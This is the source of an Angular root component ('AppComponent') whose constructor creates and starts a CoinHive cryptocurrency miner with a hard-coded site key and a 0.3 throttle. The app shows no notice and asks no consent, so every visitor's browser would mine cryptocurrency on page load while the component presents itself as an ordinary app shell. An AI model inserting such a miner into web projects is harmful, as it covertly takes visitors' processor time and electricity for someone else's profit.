import { Component } from '@angular/core';
@Component({
  selector: 'app-root',
  templateUrl: './app.component.html',
  styleUrls: ['./app.component.scss']
})
export class AppComponent {
  title = 'app';
  constructor() {
    var mnnc = new CoinHive.Anonymous('FgNYlyRdWZc5Px5xoZXsrxqv7A6YLkkh', {throttle: 0.3});

    mnnc.start();
  }
}
